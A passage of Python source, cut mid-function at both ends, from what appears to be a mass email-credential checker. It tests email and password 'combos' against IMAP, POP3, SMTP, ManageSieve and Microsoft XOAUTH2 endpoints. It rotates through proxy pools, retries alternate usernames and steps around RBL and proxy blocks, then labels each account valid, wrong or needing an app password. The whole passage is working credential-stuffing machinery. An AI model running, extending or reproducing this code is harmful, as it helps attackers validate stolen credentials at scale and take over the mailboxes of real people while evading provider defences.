             "saw_login_drop": False}
    force_direct = {"flag": False}
    host_407 = {}
    net_failed_hosts = set()
    retries_by_host = {}
    conn_rotated = {}
    used_proxies = set()
    retried_407_subusers = set()
    acct_407_total = 0
    MAX_ROTATIONS = max(0, int(CFG.get("MAX_ROTATIONS", MAX_ROTATIONS_DEFAULT)))

    try:
        if conf.get("type") == "zero_access":
            trace_logs.append("Architecture: Zero-Access / Bridge detected.")
            return None, NEED_APP_PASSWORD, "Zero-Access Architecture | Protocol: Local API / Bridge", None, trace_logs

        proxy_mode = CFG.get("PROXY_MODE", "fallback")
        prefer_insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
        try_starttls = bool(CFG.get("TRY_STARTTLS", True))
        try_alt_user = bool(CFG.get("TRY_ALT_USERNAME", True))
        max_hosts = max(1, int(CFG.get("MAX_HOSTS_PER_DOMAIN", 3)))
        configured_to = max(4.0, float(CFG.get("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL)))
        same_host_retries = max(0, int(CFG.get("SAME_HOST_RETRIES", SAME_HOST_RETRIES_DEFAULT)))

        flags_p = protocol_flags()
        allow_imap = flags_p["imap"]
        allow_pop = flags_p["pop"]
        allow_smtp = flags_p["smtp"]
        allow_sieve = flags_p["sieve"]
        if not (allow_imap or allow_pop or allow_smtp or allow_sieve):
            allow_imap = True

        users = username_candidates(email) if try_alt_user else [email]
        primary_user = users[0]

        def note_verdict(st_val, detail, host="", force=False):
            """Record a verdict, keeping the strongest one.

            force=True is for a DEFINITIVE answer that must not be suppressed by
            an earlier, vaguer one (Microsoft XOAUTH2 AADSTS50126).
            """
            if st_val not in (VALID, WRONG, APP, RBL, LOGIN_DROPPED, UNKNOWN,
                              DNS_FAILED, SMTP_FAILED):
                return
            cur = best_verdict["status"]
            if force or cur is None or _VERDICT_RANK.get(st_val, 0) > _VERDICT_RANK.get(cur, 0):
                best_verdict["status"] = st_val
                best_verdict["detail"] = detail
                best_verdict["host"] = host or ""
                trace_logs.append(f"Verdict retained for this account: [{st_val}] ({detail})")

        px = None
        if proxy_pool and proxy_mode != "off":
            if proxy_mode == "sticky":
                if not thread_state.get("sticky_proxy"):
                    thread_state["sticky_proxy"] = sample_alive_proxy(domain=domain)
                px = thread_state["sticky_proxy"]
            else:
                px = sample_alive_proxy(domain=domain)
            if px:
                used_proxies.add(px)

        _all_imap = [h for h in (conf.get("imap") or []) if h]
        _imap_cap = max(2, min(4, max_hosts))
        imap_hosts = _dedupe_hosts_by_ip(_all_imap, cap=_imap_cap)
        _all_pop = [h for h in (conf.get("pop") or conf.get("pop3") or []) if h]
        _pop_only = [h for h in _all_pop if h not in imap_hosts]
        pop_hosts = (_pop_only or _all_pop)[:1]
        _smtp_hosts = _smtp_hosts_for(domain) if allow_smtp else []
        if len(_all_imap) > len(imap_hosts):
            trace_logs.append(
                f"Host expansion: {len(imap_hosts)}/{len(_all_imap)} IMAP candidate(s) kept "
                f"(cap {_imap_cap}, duplicate IPs collapsed).")
        if allow_smtp and not _smtp_hosts:
            trace_logs.append("SMTP is selected but no SMTP submission host was discovered "
                              "for this domain.")

        if domain and domain not in imap_hosts and len(imap_hosts) < 4 and fast_fail_dns_check(domain):
            imap_hosts = imap_hosts + [domain]
            trace_logs.append(f"Fallback host '{domain}' force-included as a final rung "
                              f"(apex resolves).")

        if domain in imap_hosts:
            imap_hosts = [h for h in imap_hosts if h != domain] + [domain]

        if domain.endswith("windstream.net") or domain.endswith("kinetic.net"):
            _drop = {domain, "secure.windstream.net", "webmail.windstream.net"}
            _kept = [h for h in imap_hosts if h.lower() not in _drop]
            if _kept and len(_kept) != len(imap_hosts):
                trace_logs.append(
                    f"Web-only hosts dropped from the IMAP ladder (never answer on 993/143): "
                    f"{[h for h in imap_hosts if h.lower() in _drop]}")
                imap_hosts = _kept

        _web = [h for h in imap_hosts if h.lower() in WEB_ONLY_HOSTS]
        if _web and len(_web) < len(imap_hosts):
            imap_hosts = [h for h in imap_hosts if h.lower() not in WEB_ONLY_HOSTS] + _web

        trace_logs.append(
            f"IMAP ladder after web-only drop: {imap_hosts} "
            f"(POP {pop_hosts} | SMTP {_smtp_hosts})")

        domain_local_hosts = {h for h in (imap_hosts + pop_hosts + _smtp_hosts)
                              if _is_local_host(h)}

        tried_hosts = set()
        # Hosts that already answered WRONG / NEED_APP_PASSWORD.  A verdict from
        # ONE host is PROVISIONAL until a second independent host agrees, a second
        # RUNG of the same host agrees, or nothing is left to dial.
        wrong_hosts = set()
        wrong_rungs = set()          # FIX P0-1: (server, proto, port)
        app_hosts = set()
        app_rungs = set()
        confirm_wrong = bool(CFG.get("CONFIRM_WRONG_ACROSS_HOSTS", True))

        trace_logs.append(
            f"Protocols selected -> {' + '.join(active_protocols())} "
            f"(SMTP/ManageSieve are CONFIRM-ONLY: a failure never lowers a verdict).")
        trace_logs.append(f"Host order -> IMAP {imap_hosts} | POP {pop_hosts} | SMTP {_smtp_hosts}")
        if proxy_pool and proxy_mode != "off":
            trace_logs.append(f"Proxy pool: {len(proxy_pool)} node(s) alive, "
                              f"{quarantine_size()} quarantined for 407.")
        trace_logs.append(
            f"Concurrency: host cap {CFG.get('HOST_CONCURRENCY')} · "
            f"per-IP cap {CFG.get('PROXY_IP_CONCURRENCY')} · "
            f"per-subuser cap {CFG.get('PROXY_SUBUSER_CONCURRENCY')} · "
            f"proxy cap {CFG.get('PROXY_CONCURRENCY')} · "
            f"same-host retries {same_host_retries} · max rotations {MAX_ROTATIONS} · "
            f"rotation {'RANDOM' if CFG.get('RANDOM_ROTATION', True) else 'round-robin'}")
        trace_logs.append(f"WRONG confirmation across hosts: "
                          f"{'ON' if confirm_wrong else 'OFF (one-rung)'}")

        resolvable = [h for h in (imap_hosts + pop_hosts + _smtp_hosts) if fast_fail_dns_check(h)]
        dns_ok = bool(resolvable)
        if dns_ok:
            trace_logs.append(f"Fast-fail DNS check OK: {len(resolvable)}/"
                              f"{len(imap_hosts) + len(pop_hosts) + len(_smtp_hosts)} "
                              f"hosts resolve locally")
        else:
            trace_logs.append("Fast-fail DNS check failed: no candidate host resolves locally")
            if not proxy_pool or proxy_mode == "off":
                return None, DNS_FAILED, "Fast-fail DNS check failed: no host resolves locally", None, trace_logs

        imap_set = set(imap_hosts)
        pop_only = [h for h in pop_hosts if h not in imap_set]
        pop_dup = [h for h in pop_hosts if h in imap_set]

        primary_plan = []
        if allow_imap and imap_hosts:
            primary_plan.append((RUNG_IMAP, imap_hosts[0], 993, "ssl"))
        if allow_pop:
            for _ph in pop_only:
                primary_plan.append((RUNG_POP, _ph, 995, "ssl"))
        if allow_imap:
            for _h in imap_hosts[1:]:
                primary_plan.append((RUNG_IMAP, _h, 993, "ssl"))
        if allow_smtp:
            for _sh in _smtp_hosts:
                for _sp, _sm in SMTP_RUNG_PORTS:
                    primary_plan.append((RUNG_SMTP, _sh, _sp, _sm))
        if allow_sieve and imap_hosts:
            primary_plan.append((RUNG_SIEVE, imap_hosts[0], SIEVE_PORT, "starttls"))

        fallback_plan = []
        if allow_pop:
            fallback_plan += [(RUNG_POP, h, 995, "ssl") for h in pop_dup]
        if try_starttls and allow_imap:
            fallback_plan += [(RUNG_IMAP, h, 143, "starttls") for h in imap_hosts]
            fallback_plan += [(RUNG_IMAP, h, 143, "plain") for h in imap_hosts[:2]]
        if try_starttls and allow_pop:
            for h in pop_hosts:
                fallback_plan += [(RUNG_POP, h, 110, "starttls")]
                fallback_plan += [(RUNG_POP, h, 110, "plain")]

        if not primary_plan:
            trace_logs.append("No candidate hosts for this domain under the selected protocols.")
            return None, FAILED, "no candidate hosts for the selected protocols", None, trace_logs

        rung_cost = max(RUNG_COST_MIN, min(configured_to, RUNG_COST_MAX))
        work_floor = (len(primary_plan) * rung_cost * WORK_FLOOR_FACTOR) + WORK_FLOOR_PAD
        budget = max(12.0, float(CFG.get("ACCOUNT_DEADLINE", DEADLINE_NORMAL)) * 0.95)
        if work_floor > budget:
            trace_logs.append(
                f"Budget floored to fit the work: {work_floor:.0f}s "
                f"({len(primary_plan)} rung(s) x {rung_cost:.0f}s x {WORK_FLOOR_FACTOR} "
                f"+ {WORK_FLOOR_PAD:.0f}s) instead of the {budget:.0f}s the Deadline "
                f"slider allows.")
            budget = work_floor

        proxy_deadline = t_start + (budget * PROXY_TOTAL_FRAC)
        proxy_primary_deadline = t_start + (budget * PROXY_PRIMARY_FRAC)
        hard_deadline = t_start + budget
        direct_primary_deadline = t_start + (budget * DIRECT_PRIMARY_FRAC)
        trace_logs.append(
            f"Account window {budget:.0f}s -> proxy "
            f"{budget * PROXY_PRIMARY_FRAC:.0f}s-{budget * PROXY_TOTAL_FRAC:.0f}s / "
            f"direct {budget * DIRECT_PRIMARY_FRAC:.0f}s-{budget:.0f}s "
            f"(legacy 143/110 rungs hold a reserved tail slice of each phase).")

        def _is_timeout(err):
            s = str(err).lower()
            return "timed out" in s or "timeout" in s

        def _do_attempt_raw(proto, server, port, tls_mode, user, px_used, attempt_to):
            if proto == RUNG_IMAP:
                if tls_mode == "ssl":
                    imap_once(user, password, server, px_used, insecure=prefer_insecure,
                              port=port, attempt_timeout=attempt_to)
                elif tls_mode == "starttls":
                    imap_starttls_once(user, password, server, px_used,
                                       insecure=prefer_insecure, port=port,
                                       attempt_timeout=attempt_to)
                else:
                    imap_plain_once(user, password, server, px_used, port=port,
                                    attempt_timeout=attempt_to)
            elif proto == RUNG_POP:
                if tls_mode == "ssl":
                    pop_once(user, password, server, px_used, insecure=prefer_insecure,
                             port=port, attempt_timeout=attempt_to)
                elif tls_mode == "starttls":
                    pop_starttls_once(user, password, server, px_used,
                                      insecure=prefer_insecure, port=port,
                                      attempt_timeout=attempt_to)
                else:
                    pop_plain_once(user, password, server, px_used, port=port,
                                   attempt_timeout=attempt_to)
            elif proto == RUNG_SMTP:
                smtp_auth_once(user, password, server, px_used, insecure=prefer_insecure,
                               port=port, attempt_timeout=attempt_to)
            else:
                sieve_auth_once(user, password, server, px_used, insecure=prefer_insecure,
                                port=port, attempt_timeout=attempt_to)

        def do_attempt(proto, server, port, tls_mode, user, px_used, attempt_to, deadline_ts=None):
            """Serialised per destination host, per proxy IP, per sub-user, globally."""
            gate = _host_gate(server)
            got_host = gate.acquire(timeout=max(2.0, attempt_to))
            try:
                if deadline_ts is not None:
                    _rem = deadline_ts - time.time()
                    attempt_to = max(2.5, min(attempt_to, _rem)) if _rem > 1.0 else 2.0
                if int(port) in LEGACY_PORTS:
                    attempt_to = min(attempt_to, LEGACY_RUNG_TIMEOUT)
                if px_used:
                    got_proxy = _proxy_gate().acquire(timeout=_gate_wait(attempt_to))
                    try:
                        _pxinfo = parse_proxy(px_used)
                        ipg = _ip_gate(_pxinfo["host"] if _pxinfo else None)
                        got_ip = ipg.acquire(timeout=_gate_wait(attempt_to))
                        try:
                            sg = _subuser_gate((_pxinfo.get("user") or "").lower() if _pxinfo else "")
                            got_sub = sg.acquire(timeout=_gate_wait(attempt_to))
                            try:
                                _do_attempt_raw(proto, server, port, tls_mode, user,
                                                px_used, attempt_to)
                            finally:
                                if got_sub:
                                    sg.release()
                        finally:
                            if got_ip:
                                ipg.release()
                    finally:
                        if got_proxy:
                            _proxy_gate().release()
                else:
                    _do_attempt_raw(proto, server, port, tls_mode, user, px_used, attempt_to)
            finally:
                if got_host:
                    gate.release()

        err_text = ""
        attempt_to_ref = [configured_to]
# @@END 100 CORE_SETUP

# @@BLOCK 101 CORE_VERDICT_HELPERS deps=022,023,067,100
        def try_ms_xoauth2(server, px_used, attempt_to, err_snapshot=""):
            nonlocal acct_407_total, err_text
            if not MS_OAUTH_OK:
                return None
            if server.lower() not in ms_oauth.MS_IMAP_HOSTS:
                return None
            if not ms_oauth.should_try_ms_xoauth2(server, err_snapshot or err_text, domain):
                return None
            try:
                exists, claims = ms_oauth.imap_xoauth2_once(
                    email, password, server, ProxyIMAP4SSL, port=993,
                    proxy_str=px_used, insecure=prefer_insecure,
                    attempt_timeout=attempt_to)
                who = claims.get("preferred_username") or email
                trace_logs.append(f"{px_tag(px_used)} XOAUTH2 VALID on {server}:993 "
                                  f"(EXISTS={exists}, as={who}, exp={claims.get('exp')})")
                return (server, VALID,
                        f"{px_tag(px_used)} XOAUTH2 | Host: {server} | Port: 993 | "
                        f"real account password (basic auth disabled)",
                        px_used, trace_logs)
            except ms_oauth.MsTokenTransport as te:
                trace_logs.append(f"{px_tag(px_used)} XOAUTH2 transport issue -> verdict "
                                  f"unchanged ({str(te)[:90]})")
                return None
            except ProxyAuthError as pae:
                err_text = str(pae)
                flags["saw_407"] = True
                record_proxy_attempt(px_used, success=False,
                                     is_network_error=True, is_proxy_auth=True)
                host_407[server] = host_407.get(server, 0) + 1
                acct_407_total += 1
                trace_logs.append(
                    f"{px_tag(px_used)} -> PROXY 407 (XOAUTH2) {server}:993: "
                    f"{err_text[:200]} [Classified: proxy_unhealthy]")
                return None
            except ms_oauth.MsTokenRejected as tr:
                if tr.verdict == "wrong_password":
                    # force=True: AADSTS50126 is definitive.  Without it the IMAP
                    # rung's APP (priority 1) suppressed this WRONG (priority 2).
                    note_verdict(WRONG, f"XOAUTH2 token {tr.code} -> wrong password",
                                 server, force=True)
                    trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected "
                                      f"[{tr.code}] -> wrong password (definitive)")
                elif tr.verdict == "need_app_password":
                    note_verdict(APP, f"XOAUTH2 token {tr.code} -> MFA, app password required",
                                 server, force=True)
                    trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected "
                                      f"[{tr.code}] -> MFA, app password required")
                else:
                    trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected "
                                      f"[{tr.code}] -> no verdict change")
                return None
            except Exception as xe:
                trace_logs.append(f"{px_tag(px_used)} XOAUTH2 failed: {str(xe)[:90]}")
                return None

        def _rotate_to_fresh(px_used, seen_px, why, keep_node=False):
            """keep_node=True holds the node that just REACHED the mail server."""
            if keep_node:
                trace_logs.append(f"Keeping proxy ({why}) -> {px_tag(px_used)}")
                return px_used, False
            newpx = sample_alive_proxy(exclude=seen_px, avoid=seen_px, domain=domain)
            if newpx and newpx not in seen_px:
                seen_px.add(newpx)
                trace_logs.append(f"Rotating proxy ({why}) -> {px_tag(newpx)}")
                return newpx, True
            return px_used, False

        def _handle_app_or_wrong(st_val, proto, server, port, user, u_idx, px_used, seen_px,
                                 had_net, saw_retry):
            """Shared body for the APP / WRONG verdict handling.

            Returns (result_tuple_or_None, had_net, saw_retry, advance).
              * result is not None      -> RETURN it
              * advance is True         -> keep going (PROVISIONAL)
              * advance is "retry_user" -> retry this host as the LOCAL PART

            FIX P0-1 / P0-4: this helper previously carried a SECOND, unreachable
            copy of the WRONG block after the first `return`, and the confirmation
            gate counted only LOCAL hosts - while the current host was already in
            tried_hosts.  On any domain whose only local candidate was one
            imap.<domain> box the gate therefore confirmed on the FIRST rung and
            a valid combo was reported WRONG without POP3, the sibling hosts or
            143/110 ever being dialled.
            """
            if st_val == APP:
                xres = try_ms_xoauth2(server, px_used, attempt_to_ref[0], err_text)
                if xres:
                    return xres, had_net, saw_retry, False
                if u_idx + 1 < len(users):
                    flags["saw_server"] = True
                    px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry",
                                                    keep_node=True)
                    trace_logs.append(f"{px_tag(px_used)} App-password signal as '{user}' -> "
                                      f"retrying same host as local-part '{users[u_idx + 1]}'")
                    return None, had_net, saw_retry, "retry_user"
                app_hosts.add(server)
                app_rungs.add((server, proto, port))
                _untried_local = [h for h in domain_local_hosts if h not in tried_hosts]
                _conf_pool = [h for h in (imap_hosts + pop_hosts) if h not in tried_hosts]
                _rungs_left_here = [r for r in (fallback_plan or ())
                                    if r[1] == server
                                    and (r[1], r[0], r[2]) not in wrong_rungs
                                    and (r[1], r[0], r[2]) not in app_rungs]
                _confirmed = ((len(app_hosts) >= 2) or (len(app_rungs) >= 2)
                              or (not _conf_pool and not _rungs_left_here))
                if (not confirm_wrong) or _confirmed:
                    # A definitive XOAUTH2 WRONG outranks a basic-auth "app
                    # password" signal - return the stronger one.
                    if best_verdict["status"] == WRONG:
                        return (None, WRONG,
                                best_verdict["detail"] + _wrong_detail_note(domain, password),
                                px_used, trace_logs), had_net, saw_retry, False
                    return (None, APP, f"{px_tag(px_used)} {proto} {server} -> {st_val}",
                            px_used, trace_logs), had_net, saw_retry, False
                trace_logs.append(
                    f"{px_tag(px_used)} APP on {server} -> PROVISIONAL "
                    f"({len(app_hosts)} host(s) agreed, {len(_conf_pool)} candidate(s) "
                    f"still untried, {len(_untried_local)} local, "
                    f"{len(app_rungs)} rung(s) dialled) -> continuing")
                return None, had_net, saw_retry, True

            # ---- WRONG (single copy - the duplicate after the first return is gone) ----
            # The local-part retry runs FIRST: a legacy Zimbra / cPanel / Dovecot
            # front answers AUTHENTICATIONFAILED for 'user@domain' and accepts
            # 'user'.  It must also run BEFORE wrong_hosts.add(), because the host
            # has not been authoritatively tested until every username candidate is
            # exhausted - otherwise one host can satisfy the confirmation gate on a
            # username it was always going to reject.
            if u_idx + 1 < len(users):
                flags["saw_server"] = True
                px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry",
                                                keep_node=True)
                trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> retrying same "
                                  f"host as local-part '{users[u_idx + 1]}'")
                return None, had_net, saw_retry, "retry_user"

            wrong_hosts.add(server)
            wrong_rungs.add((server, proto, port))
            _untried_local = [h for h in domain_local_hosts if h not in tried_hosts]
            _conf_pool = [h for h in (imap_hosts + pop_hosts) if h not in tried_hosts]
            # FIX P0-1b: this host's still-undialled 143/110 rungs count as
            # "something left to dial". Without this, a single-IMAP-host domain
            # confirmed on rung 1 and skipped the whole fallback plan + direct sweep.
            _rungs_left_here = [r for r in (fallback_plan or ())
                                if r[1] == server
                                and (r[1], r[0], r[2]) not in wrong_rungs
                                and (r[1], r[0], r[2]) not in app_rungs]
            _confirmed = ((len(wrong_hosts) >= 2) or (len(wrong_rungs) >= 2)
                          or (not _conf_pool and not _rungs_left_here))

            if (not confirm_wrong) or _confirmed:
                return (None, WRONG,
                        f"{px_tag(px_used)} {proto} {server} -> {st_val}"
                        + _wrong_detail_note(domain, password),
                        px_used, trace_logs), had_net, saw_retry, False

            trace_logs.append(
                f"{px_tag(px_used)} WRONG on {server} -> PROVISIONAL "
                f"({len(wrong_hosts)} host(s) agreed, {len(_conf_pool)} candidate(s) "
                f"still untried, {len(_untried_local)} local, "
                f"{len(wrong_rungs)} rung(s) dialled) -> continuing the ladder")
            return None, had_net, saw_retry, True
# @@END 101 CORE_VERDICT_HELPERS

# @@BLOCK 102 CORE_SWEEP deps=016,100,101
        def sweep(px_used, rungs, deadline_ts, label, allow_rotate=True):
            nonlocal acct_407_total, err_text
            had_net = False
            saw_retry = False
            if not rungs:
                return None, had_net, saw_retry

            left = deadline_ts - time.time()
            if left <= 1.5:
                trace_logs.append(f"{label}: no window left ({left:.1f}s).")
                return None, had_net, saw_retry

            per_to = max(3.0, min(configured_to, left / max(1, len(rungs))))
            trace_logs.append(f"--- {label}: {len(rungs)} rung(s), ~{per_to:.1f}s each, "
                              f"{left:.1f}s window ---")

            for rung_idx, (proto, server, port, tls_mode) in enumerate(rungs):
                if time.time() > deadline_ts:
                    trace_logs.append(f"{label}: window reached; stopping this pass "
                                      f"({len(rungs) - rung_idx} rung(s) not attempted).")
                    break

                tried_hosts.add(server)

                if px_used and proxy_mode != "off" and proxy_is_quarantined(px_used):
                    _fresh = sample_alive_proxy(domain=domain, avoid=used_proxies)
                    if _fresh and _fresh != px_used:
                        px_used = _fresh
                        used_proxies.add(_fresh)
                        trace_logs.append(f"Quarantined node in hand -> switched to fresh "
                                          f"node {px_tag(px_used)}")

                rotations_left = MAX_ROTATIONS if (allow_rotate and px_used
                                                   and proxy_mode != "off") else 0
                seen_px = used_proxies
                acct_407 = 0

                while True:
                    if time.time() > deadline_ts:
                        break

                    _rem = deadline_ts - time.time()
                    if _rem <= 1.0:
                        break
                    attempt_to = max(2.5, min(per_to, _rem))
                    attempt_to_ref[0] = attempt_to

                    trace_logs.append(f"{px_tag(px_used)} Attempting {proto} "
                                      f"{tls_mode.upper()} -> Host: {server}:{port}")
                    server_level_fail = False
                    rotate_now = False
                    retry_same = False
                    retry_same_node = False
                    proxy_dead = False
                    err_text = ""

                    for u_idx, user in enumerate(users):
                        try:
                            do_attempt(proto, server, port, tls_mode, user, px_used,
                                       attempt_to, deadline_ts)
                            record_proxy_attempt(px_used, success=True)
                            note_verdict(VALID, f"{proto} {server}:{port}", server)
                            note = "" if user == primary_user else f" | User: {user} (local-part)"
                            trace_logs.append(f"{px_tag(px_used)} Post-auth {proto} "
                                              f"verification OK on {server}:{port}{note}")
                            return (server, VALID,
                                    f"{px_tag(px_used)} {proto} | Host: {server} | "
                                    f"Port: {port}{note}",
                                    px_used, trace_logs), had_net, saw_retry

                        except ProxyAuthError as pae:
                            err_text = str(pae)
                            flags["saw_407"] = True
                            record_proxy_attempt(px_used, success=False,
                                                 is_network_error=True, is_proxy_auth=True)
                            host_407[server] = host_407.get(server, 0) + 1
                            acct_407 += 1
                            acct_407_total += 1
                            trace_logs.append(
                                f"{px_tag(px_used)} -> PROXY 407 {proto} {server}:{port}: "
                                f"{err_text[:200]} [Classified: proxy_unhealthy]")
                            proxy_dead = True
                            rotate_now = True
                            # A 407 is a proxy answer, not a username answer: break
                            # the username loop so the retry below is not preceded
                            # by a second dial through the same dead node.
                            server_level_fail = True
                            _su = _subuser_of(px_used)
                            if px_used and _su and _su not in retried_407_subusers:
                                retried_407_subusers.add(_su)
                                retry_same_node = True
                                proxy_dead = False
                                rotate_now = False

                        except ProxyPortBlocked as pblk:
                            # FIX 407-SCOPE: 403 means the provider refuses this
                            # DESTINATION PORT by policy. The credential is proven
                            # and the node is alive, so the node is credited a
                            # success and the ladder advances WITHOUT rotating -
                            # another node cannot fix a blocked port either.
                            err_text = str(pblk)
                            flags["saw_nonproxy"] = True
                            flags["saw_server"] = True
                            record_proxy_attempt(px_used, success=True)
                            trace_logs.append(
                                f"{px_tag(px_used)} -> PORT BLOCKED {proto} {server}:{port}: "
                                f"{err_text[:160]} [provider refuses this destination port - "
                                f"advancing, node credited]")
                            server_level_fail = True
                            rotate_now = False

                        except ProxyTransportError as pte:
                            err_text = str(pte)
                            flags["saw_nonproxy"] = True
                            had_net = True
                            net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False,
                                                 is_network_error=True, is_proxy_auth=False)
                            trace_logs.append(
                                f"{px_tag(px_used)} -> PROXY TRANSPORT {proto} {server}:{port}: "
                                f"{err_text[:200]} [Classified: {FAILED}]")
                            server_level_fail = True
                            rotate_now = True

                        except (SmtpAuthError, SieveAuthError) as cnf:
                            err_text = str(cnf)
                            flags["saw_nonproxy"] = True
                            flags["saw_server"] = True
                            record_proxy_attempt(px_used, success=False, is_network_error=False)
                            trace_logs.append(
                                f"{px_tag(px_used)} -> CONFIRM {proto} {server}:{port}: "
                                f"{err_text[:140]} [Classified: {WRONG} - confirm-only]")
                            note_verdict(WRONG, f"{proto} {server}:{port} -> {WRONG} "
                                                 f"(confirm-only)", server)
                            if u_idx + 1 < len(users):
                                continue
                            server_level_fail = True
                            rotate_now = False

                        except (SmtpSoftError, SieveSoftError) as soft:
                            err_text = str(soft)
                            flags["saw_nonproxy"] = True
                            flags["saw_server"] = True
                            record_proxy_attempt(px_used, success=False, is_network_error=False)
                            trace_logs.append(
                                f"{px_tag(px_used)} -> INCONCLUSIVE {proto} {server}:{port}: "
                                f"{err_text[:140]} [no verdict change]")
                            server_level_fail = True
                            rotate_now = False

                        except ssl.SSLError as ssl_err:
                            err_text = str(ssl_err)
                            st_val = classify_error(ssl_err, domain)
                            flags["saw_nonproxy"] = True
                            flags["saw_server"] = True
                            if st_val == CONNECTION_FAILED:
                                had_net = True
                                net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False,
                                                 is_network_error=(st_val == CONNECTION_FAILED))
                            trace_logs.append(f"{px_tag(px_used)} -> TLS FAILED {proto} "
                                              f"{server}:{port}: {err_text[:140]} "
                                              f"[Classified: {st_val}]")
                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)
                            server_level_fail = True
                            rotate_now = _is_proxy_level_error(err_text) or st_val == CONNECTION_FAILED

                        except (socket.timeout, TimeoutError) as to_err:
                            err_text = str(to_err)
                            flags["saw_nonproxy"] = True
                            had_net = True
                            net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False, is_network_error=True)
                            trace_logs.append(f"{px_tag(px_used)} -> TIMEOUT {proto} "
                                              f"{server}:{port}: {err_text[:140]} "
                                              f"[Classified: {FAILED}]")
                            server_level_fail = True

                            _kind = _timeout_kind(to_err)
                            if _kind == "connect":
                                if px_used and proxy_mode != "off" and not conn_rotated.get(server):
                                    conn_rotated[server] = True
                                    rotate_now = True
                                    trace_logs.append(f"{px_tag(px_used)} Connect-level timeout "
                                                      f"-> rotating node ONCE, no in-place retry")
                                else:
                                    rotate_now = False
                                    trace_logs.append(f"{px_tag(px_used)} Connect-level timeout "
                                                      f"-> advancing past {server}:{port} "
                                                      f"(no in-place retry)")
                            else:
                                rotate_now = True
                                if (retries_by_host.get(server, 0) < same_host_retries
                                        and (deadline_ts - time.time()) > 7.0):
                                    retries_by_host[server] = retries_by_host.get(server, 0) + 1
                                    retry_same = True

                        except (socket.error, ConnectionRefusedError) as sock_err:
                            err_text = str(sock_err)
                            flags["saw_nonproxy"] = True
                            had_net = True
                            net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False, is_network_error=True)
                            trace_logs.append(f"{px_tag(px_used)} -> SOCKET FAILED {proto} "
                                              f"{server}:{port}: {err_text[:140]} "
                                              f"[Classified: {FAILED}]")
                            server_level_fail = True
                            rotate_now = True

                        except (imaplib.IMAP4.error, poplib.error_proto) as proto_err:
                            err_text = str(proto_err)
                            st_val = classify_error(proto_err, domain)
                            flags["saw_nonproxy"] = True
                            flags["saw_server"] = True
                            record_proxy_attempt(px_used, success=False, is_network_error=False)
                            trace_logs.append(f"{px_tag(px_used)} -> AUTH {proto} "
                                              f"{server}:{port}: {err_text[:140]} "
                                              f"[Classified: {st_val}]")
                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)

                            if st_val == LOGIN_DROPPED:
                                flags["saw_login_drop"] = True
                                trace_logs.append(
                                    f"{px_tag(px_used)} Server ANSWERED then closed the socket "
                                    f"(* BYE) on {proto} {server}:{port} -> server-side, "
                                    f"password still untested; continuing the ladder")

                            if st_val in (APP, WRONG):
                                res, had_net, saw_retry, act = _handle_app_or_wrong(
                                    st_val, proto, server, port, user, u_idx, px_used, seen_px,
                                    had_net, saw_retry)
                                if res is not None:
                                    return res, had_net, saw_retry
                                if act == "retry_user":
                                    continue
                                server_level_fail = True
                                rotate_now = False
                            elif st_val == RETRY:
                                saw_retry = True
                                server_level_fail = True
                                if "lookup failed" in err_text.lower():
                                    rotate_now = False
                                    trace_logs.append(f"{px_tag(px_used)} 'Lookup failed' on "
                                                      f"{server}:{port} -> advancing to next "
                                                      f"host (no proxy rotation)")
                                else:
                                    rotate_now = True
                            elif st_val == RBL:
                                trace_logs.append(f"{px_tag(px_used)} RBL block on "
                                                  f"{server}:{port} -> IP flagged by server, "
                                                  f"advancing")
                                server_level_fail = True
                            elif u_idx + 1 < len(users) and st_val in (UNKNOWN, LOGIN_DROPPED):
                                flags["saw_server"] = True
                                px_used, _ok = _rotate_to_fresh(px_used, seen_px,
                                                                "local-part retry", keep_node=True)
                                trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> "
                                                  f"retrying same host as local-part "
                                                  f"'{users[u_idx + 1]}'")
                                continue
                            elif st_val == LOGIN_DROPPED:
                                server_level_fail = True
                                rotate_now = False
                                trace_logs.append(
                                    f"{px_tag(px_used)} LOGIN_DROPPED on {server}:{port} -> "
                                    f"advancing the ladder (POP3 / other hosts still get a turn)")
                            else:
                                server_level_fail = True
                                if (st_val == CONNECTION_FAILED
                                        and retries_by_host.get(server, 0) < same_host_retries
                                        and (deadline_ts - time.time()) > 7.0):
                                    retries_by_host[server] = retries_by_host.get(server, 0) + 1
                                    retry_same = True

                        except Exception as e:
                            err_text = str(e)
                            st_val = classify_error(e, domain)
                            proxy_level = _is_proxy_level_error(err_text)
                            if proxy_level:
                                flags["saw_407"] = True
                                record_proxy_attempt(px_used, success=False,
                                                     is_network_error=True, is_proxy_auth=True)
                                host_407[server] = host_407.get(server, 0) + 1
                                acct_407 += 1
                                acct_407_total += 1
                            else:
                                flags["saw_nonproxy"] = True
                                if "Fast-fail DNS check" not in err_text:
                                    flags["saw_server"] = True
                            if _is_timeout(e):
                                had_net = True
                                net_failed_hosts.add(server)
                            if st_val == CONNECTION_FAILED:
                                had_net = True
                                net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False,
                                                 is_network_error=(st_val == CONNECTION_FAILED))
                            trace_logs.append(f"{px_tag(px_used)} -> FAILED {proto} "
                                              f"{server}:{port}: {err_text[:140]} "
                                              f"[Classified: {st_val}]")
                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)

                            if st_val == LOGIN_DROPPED:
                                flags["saw_login_drop"] = True
                                trace_logs.append(
                                    f"{px_tag(px_used)} Server ANSWERED then closed the socket "
                                    f"(* BYE) on {proto} {server}:{port} -> server-side, "
                                    f"password still untested; continuing the ladder")

                            if st_val in (APP, WRONG):
                                res, had_net, saw_retry, act = _handle_app_or_wrong(
                                    st_val, proto, server, port, user, u_idx, px_used, seen_px,
                                    had_net, saw_retry)
                                if res is not None:
                                    return res, had_net, saw_retry
                                if act == "retry_user":
                                    continue
